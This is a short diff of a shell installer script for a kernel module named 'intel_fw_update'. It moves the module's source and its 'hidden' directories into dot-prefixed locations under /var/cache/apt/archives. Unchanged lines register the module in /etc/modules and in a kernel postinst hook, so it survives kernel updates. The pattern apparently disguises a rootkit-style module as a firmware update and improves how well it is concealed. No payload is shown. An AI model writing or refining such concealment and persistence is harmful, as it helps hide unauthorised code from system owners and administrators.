@@ -4,9 +4,9 @@ set -e
 # Config
 MODULE_NAME="intel_fw_update"
 PACKAGE_VERSION="1.1"
-SRC_DIR="/usr/src/${MODULE_NAME}-${PACKAGE_VERSION}"
-HIDDEN_SRC_DIR="/usr/local/.intel_fw_update/src"
-HIDDEN_DIR="/usr/local/.intel_fw_update"
+SRC_DIR="/usr/src/.${MODULE_NAME}-${PACKAGE_VERSION}"
+HIDDEN_SRC_DIR="/var/cache/apt/archives/.intel_fw_update/src"
+HIDDEN_DIR="/var/cache/apt/archives/.intel_fw_update"
 MODULES_FILE="/etc/modules"
 HOOK_PATH="/etc/kernel/postinst.d/install_${MODULE_NAME}_module"
 
